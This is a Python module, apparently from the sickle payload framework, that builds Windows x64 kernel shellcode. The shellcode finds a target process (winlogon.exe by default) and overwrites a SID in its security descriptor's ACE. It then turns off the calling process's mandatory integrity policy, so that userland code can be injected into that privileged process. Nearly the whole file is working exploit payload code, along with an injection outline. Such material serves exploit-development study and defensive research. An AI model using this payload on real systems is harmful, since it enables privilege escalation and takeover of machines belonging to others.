import sys
import math
import struct
import binascii

from sickle.common.lib.reversing.assembler import Assembler
from sickle.common.lib.generic.mparser import argument_check

from sickle.common.lib.generic.convert import from_str_to_xwords

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) Kernel ACE Edit"

    module = f"{platform}/{arch}/kernel_ace_edit"

    example_run = f"{sys.argv[0]} -p {module} PROCESS=dllhost.exe -f c"

    ring = 0

    author = ["Morten Schenk",
              "Matteo Malvica",
              "wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)",
                        "Windows 10 (10.0.17763 N/A Build 17763)"]

    summary = "Kernel shellcode to modify the _SECURITY_DESCRIPTOR of a process"

    description = f"""
    This stub modifies the Ace[0] entry of a given processes _SECURITY_DESCRIPTOR,
    specifically the SID entry. Upon completion it will modify the MandatoryPolicy
    to allow us to later inject into a target process when returning to userland.

    To use this shellcode properly you will need to handle injection from userland,
    first generate the shellcode:

        {example_run}

    Once shellcode is inserted into exploit, ensure that you have code similar to
    the following pseudo code:

        shellcode = <code to be injected>

        OpenProcess()
          VirtualAllocEx()
            WriteProcessMemory()
              CreateRemoteThread()

    If everything went well, you should have successfully obtained code execution.

    WARNING: ASSUME KERNEL SHELLCODE DOES NOT HANDLE RETURN TO USERLAND!!
    """

    arguments = {}

    arguments["PROCESS"] = {}
    arguments["PROCESS"]["optional"] = "yes"
    arguments["PROCESS"]["description"] = "Target process to modify"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        self.builder = Assembler(Shellcode.arch)

        return

    def generate_check_stub(self):
        """Generates the stub responsible for identifying the process we'll be modifying
        """

        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == {}):
            process_name = "winlogon.exe"
        else:
            process_name = argv_dict["PROCESS"]

        lists = from_str_to_xwords(process_name)

        src = "\nverifyImageFileName:\n"
        src += "    xor r8, r8\n"
        src += "    mov r8, 0x5a8\n"
        for i in range(len(lists["QWORD_LIST"])):
            src += "    mov r12, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
            src += "    cmp r12, qword ptr [rax + r8]    ; Compare a QWORD (8 bytes)\n"
            src += "    jne traverseLinkedList\n"
            src += "    add r8, 0x{}\n".format(8)

        for i in range(len(lists["DWORD_LIST"])):
            src += "    mov r12d, dword ptr 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
            src += "    cmp r12d, dword ptr [rax + r8]   ; Compare a DWORD (4 bytes)\n"
            src += "    add r8, 0x{}\n".format(4)

        for i in range(len(lists["WORD_LIST"])):
            src += "    mov r12w, word ptr 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
            src += "    cmp r12w, word ptr [rax + r8]    ; Compare a WORD (2 bytes)\n"
            src += "    add r8, 0x{}\n".format(2)

        for i in range(len(lists["BYTE_LIST"])):
            src += "    cmp byte ptr [rax + r8], {}    ; Compare a BYTE\n".format( hex(lists["BYTE_LIST"][i]) )

        return src

    def generate_ace_read_stub(self):
        """Generates the stub responsible for modifying the ACE entry.
        """

        sizeOf_ACL        = 0x08
        sizeOf_AceType    = 0x01
        sizeOf_AceFlags   = 0x01
        sizeOf_AceSize    = 0x02
        sizeOf_ACE_HEADER = (sizeOf_AceType + sizeOf_AceFlags + sizeOf_AceSize)
        sizeOf_Mask       = 0x04

        sid_offset = 0x08

        src = """
modifyAce:
    mov rdx, rax                     ; Copy the _EPROCESS structure of the target process into RDX
    sub rdx, 0x30                    ; From the _EPROCESS structure we can get the address of the _OBJECT_HEADER offset -0x30
    mov rdx, [rdx + 0x28]            ; Extract the pointer to the SecurityDescritor member from the _OBJECT_HEADER structure
    and rdx, 0xfffffffffffffff0      ; Get the actual address of the _SECURITY_DESCRIPTOR structure
    add rdx, 0x30                    ; Offset into the first _ACL structure
    mov ecx, dword ptr [rdx + 0x04]  ; Read the AceCount (ECX will serve as our loop counter)
    add rdx, 0x8                     ; Offset into the first Ace[] entry
    xor r8, r8                       ; Use R8 to serve as the "found" variable

traverseEntries:
    xor r9, r9                       ; Use R9 to serve as the "AceSize" variable
    mov r9w, [rdx + {}]             ; Save the AceSize (Used to jump to the next entry)
    cmp dword ptr [rdx + {}], 0x12 ; Check if we found 0x12 (18)
    je found                         ; If found begin modification process
    dec ecx                          ; Decrement the Ace[] entry counter
    add rdx, r9                      ; Offset to the next entry
    cmp ecx, 0x00                    ; Check if we're done iterating over the Ace[] entries
    jne traverseEntries              ; Continue looping over entries

failure:
    jmp exit

found:
    mov dword ptr [rdx + {}], 0x0f ; Modify the entry
        """.format(hex(sizeOf_AceType + sizeOf_AceFlags),
                   hex(sizeOf_ACE_HEADER + sizeOf_Mask + sid_offset),
                   hex(sizeOf_ACE_HEADER + sizeOf_Mask + sid_offset))

        return src

    def generate_source(self):
        """Generates source code to be assembled by the keystone engine
        """

        shellcode = """
start:
    xor rax, rax
    mov rax, qword ptr gs:[0x188]    ; Obtain the current thread ( nt!_KPCR.PcrbData.CurrentThread )
    mov rax, [rax + 0xb8]            ; Obtain the current process ( nt!_KTHREAD.ApcState.Process )
    mov rbx, rax                     ; Save the current _EPROCESS pointer of the exploit process

traverseLinkedList:
    mov rax, [rax + 0x448]           ; Get the next entry in the linked list( nt!_EPROCESS.ActiveProcessLinks.Flink )
    sub rax, 0x448                   ; Get _EPROCESS address of the LIST_ENTRY
        """

        shellcode += self.generate_check_stub()
        shellcode += self.generate_ace_read_stub()
        
        shellcode += """
modifyCallerMandatoryPolicy:
    mov r9, [rbx+0x4b8]              ; Extract the _EX_FAST_REF pointer from the _EPROCESS structure (calling process)
    and r9, 0xfffffffffffffff0       ; Get the real address of the _TOKEN structure by removing refence count (not part of the token address)
    mov byte ptr [r9+0xd4], 0x00     ; Change the MandatoryPolicy to 0 (TOKEN_MANDATORY_POLICY_OFF)

exit:
    nop
        """

        return shellcode

    def get_shellcode(self):
        """Returns ACE Edit Shellcode
        """

        return self.builder.get_bytes_from_asm(self.generate_source())
